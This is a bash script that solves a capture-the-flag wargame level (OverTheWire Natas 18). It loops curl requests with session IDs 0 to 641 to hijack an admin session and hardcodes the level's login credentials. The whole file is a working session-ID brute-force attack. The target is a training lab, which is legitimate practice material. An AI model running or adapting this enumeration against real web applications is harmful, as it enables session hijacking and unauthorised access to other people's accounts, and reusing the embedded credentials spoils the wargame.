#session_prediction
#!/bin/bash

url=http://natas18.natas.labs.overthewire.org/
auth="natas18:6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ"
success="You are an admin. The credentials for the next level*"

for id in {0..641}
do
    echo "id: $id"
    if(curl \
    -u $auth \
    -b "PHPSESSID=$id" \
    -s \
    -o 2>/dev/null \
    -d "username=admin" \
    -d "password=1" \
    $url \
    | grep -A 2 "$success")
    then
        echo "Success"
        break
    fi
done